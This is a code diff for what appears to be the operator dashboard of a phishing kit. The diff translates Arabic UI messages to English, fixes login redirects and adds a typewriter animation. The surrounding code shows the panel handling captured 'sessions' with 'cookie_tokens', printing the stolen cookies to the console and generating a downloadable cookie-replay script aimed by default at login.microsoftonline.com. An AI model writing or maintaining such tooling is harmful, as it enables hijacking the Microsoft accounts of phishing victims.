@@ -72,7 +72,7 @@ function handleApiError(error) {
     if (error.status === 401) {
         // Logout if authentication is invalid
         localStorage.removeItem('authToken');
-        window.location.href = '/login';
+        window.location.href = '/login.html';
     }
     showToast('Error', error.message || 'An error occurred while connecting to the server', 'error');
 }
@@ -1087,14 +1087,20 @@ function populateSessionsTable(sessions) {
                 const sessionData = await fetchSessionDetails(id);
                 console.log('Session data for cookies:', sessionData);
                 
-                // التحقق من وجود tokens في بيانات الجلسة
+                // إضافة تحقق من وجود بيانات الجلسة
+                if (!sessionData) {
+                    showToast('Error', 'Session data not found', 'error');
+                    return;
+                }
+                
+                // التحقق من وجود cookie_tokens
                 const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
                 
-                // استدعاء دالة تنزيل الكوكيز مع بيانات الجلسة
+                // إنشاء سكريبت الكوكيز
                 downloadCookiesScript(sessionData);
             } catch (error) {
                 console.error('Error fetching session details:', error);
-                showToast('خطأ', 'فشل في تحميل تفاصيل الجلسة', 'error');
+                showToast('Error', 'Failed to load session details', 'error');
             }
         });
     });
@@ -1301,7 +1307,7 @@ logoutBtn.addEventListener('click', function() {
     // Remove token from local storage
     localStorage.removeItem('authToken');
     // Redirect user to login page
-    window.location.href = '/login';
+    window.location.href = '/login.html';
 });
 
 // Perform SSL certificates update request
@@ -1341,10 +1347,51 @@ async function updateCertificates() {
 document.addEventListener('DOMContentLoaded', function() {
     setupEventListeners();
     updateDashboard();
+    initTypewriterEffect();
     
     // Auto-refresh dashboard every 60 seconds
     setInterval(updateDashboard, 60000);
 });
+
+// Initialize typewriter effect
+function initTypewriterEffect() {
+    const typewriterElements = document.querySelectorAll('.typewriter');
+    
+    typewriterElements.forEach(element => {
+        const text = element.getAttribute('data-text');
+        if (!text) return;
+        
+        // Reset element content
+        element.textContent = '';
+        
+        // Add characters one by one
+        let charIndex = 0;
+        const typeInterval = setInterval(() => {
+            if (charIndex < text.length) {
+                element.textContent += text.charAt(charIndex);
+                charIndex++;
+            } else {
+                clearInterval(typeInterval);
+                
+                // Wait and then remove characters to restart effect
+                setTimeout(() => {
+                    const eraseInterval = setInterval(() => {
+                        if (element.textContent.length > 0) {
+                            element.textContent = element.textContent.slice(0, -1);
+                        } else {
+                            clearInterval(eraseInterval);
+                            
+                            // Wait and restart
+                            setTimeout(() => {
+                                initTypewriterEffect();
+                            }, 1000);
+                        }
+                    }, 75);
+                }, 3000);
+            }
+        }, 100);
+    });
+}
 
 // Setup event listeners
 function setupEventListeners() {
@@ -1426,7 +1473,7 @@ function setupEventListeners() {
     if (logoutBtn) {
         logoutBtn.addEventListener('click', function() {
             localStorage.removeItem('authToken');
-            window.location.href = '/login';
+            window.location.href = '/login.html';
         });
     }
 }
@@ -1437,7 +1484,7 @@ function downloadCookiesScript(sessionData) {
     const sessionId = downloadBtn.dataset.sessionId;
     
     if (!sessionId) {
-        showToast('خطأ', 'لم يتم العثور على معرف الجلسة', 'error');
+        showToast('Error', 'Session ID not found', 'error');
         return;
     }
     
@@ -1484,7 +1531,7 @@ function downloadCookiesScript(sessionData) {
         
         // إذا لم يتم العثور على أي كوكيز من البيانات، عرض رسالة
         if (cookies.length === 0) {
-            showToast('تحذير', 'لم يتم العثور على كوكيز في بيانات الجلسة', 'warning');
+            showToast('Warning', 'No cookies found for this session', 'warning');
             
             // قد نستخدم الطريقة القديمة للحصول على الكوكيز من الجدول
             const cookiesTable = document.getElementById('cookies-table');
@@ -1519,7 +1566,7 @@ function downloadCookiesScript(sessionData) {
             
             // التحقق من وجود كوكيز
             if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
-                showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
+                showToast('Error', 'No cookies found for this session', 'error');
                 return;
             }
             
@@ -1546,12 +1593,12 @@ function downloadCookiesScript(sessionData) {
     
     // التحقق النهائي من وجود كوكيز
     if (cookies.length === 0) {
-        showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
+        showToast('Error', 'No cookies found for this session', 'error');
         return;
     }
     
-    // ***** طباعة الكوكيز في سجلات المتصفح بشكل مفصل *****
-    console.log('%c🍪 كوكيز الجلسة ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
+    // Print cookies in browser console
+    console.log('%c🍪 Session Cookies ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
     console.log('%c=================================', 'color:#3498db;');
     
     cookies.forEach((cookie, index) => {
@@ -1563,7 +1610,7 @@ function downloadCookiesScript(sessionData) {
     });
     
     console.log('%c=================================', 'color:#3498db;');
-    console.log('%cعدد الكوكيز: ' + cookies.length, 'font-weight:bold;');
+    console.log('%cTotal Cookies: ' + cookies.length, 'font-weight:bold;');
     
     // الحصول على النطاق المستهدف للانتقال بعد تعيين الكوكيز
     const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
@@ -1586,7 +1633,7 @@ function downloadCookiesScript(sessionData) {
     document.body.removeChild(downloadLink);
     
     // إظهار رسالة نجاح
-    showToast('نجاح', 'تم إنشاء سكريبت الكوكيز بنجاح وطباعته في سجلات المتصفح', 'success');
+    showToast('Success', 'Cookies script created successfully and printed in browser console', 'success');
 }
 
 // Export statistics to CSV
